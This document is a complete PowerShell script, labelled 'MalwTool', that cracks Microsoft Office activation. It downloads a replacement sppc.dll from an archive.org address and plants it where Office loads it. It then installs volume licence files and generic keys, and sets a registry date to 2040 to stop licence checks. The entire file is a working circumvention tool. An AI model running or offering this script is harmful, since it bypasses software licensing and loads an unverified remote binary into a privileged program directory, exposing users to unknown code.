$Product = $Product.Replace('Office ', '')
if ($PSUICulture -eq "ru-RU") {$host.ui.RawUI.WindowTitle = "MalwTool — Активация Office $Product через подмену sppcs.dll"}
else {$host.ui.RawUI.WindowTitle = "MalwTool — Activating Office $Product via replacing sppcs.dll"}

$lics = @{"365" = "O365ProPlusR"; "2024" = "ProPlus2024VL_KMS"; "2021" = "ProPlus2021VL_KMS"; "2019" = "ProPlus2019VL"; "2016" = "proplusvl_kms"}
$keys = @{"365" = "2N382-D6PKK-QTX4D-2JJYK-M96P2"; "2024" = "VWCNX-7FKBD-FHJYG-XBR4B-88KC6"; "2021" = "FXYTK-NJJ8C-GB6DW-3DYQT-6F7TH"; "2019" = "BN4XJ-R9DYY-96W48-YK8DM-MY7PY"; "2016" = "XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99"}

cmd /c mklink "$env:ProgramFiles\Microsoft Office\root\vfs\System\sppcs.dll" "$env:SystemRoot\System32\sppc.dll"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object net.webclient
$wc.DownloadFile('https://archive.org/download/asdcorpohook/sppc.dll', "$env:ProgramFiles\Microsoft Office\root\vfs\System\sppc.dll")
Set-Location "$env:ProgramFiles\Microsoft Office\Office16"
Get-ChildItem -Path "..\root\Licenses16\" -Filter "$($lics[$Product])*.xrm-ms" | ForEach-Object { cscript ospp.vbs /inslic:"$($_.FullName)" }
cscript //nologo ospp.vbs /inpkey:$($keys[$Product])
reg add HKCU\Software\Microsoft\Office\16.0\Common\Licensing\Resiliency /v "TimeOfLastHeartbeatFailure" /t REG_SZ /d "2040-01-01T00:00:00Z" /f
pause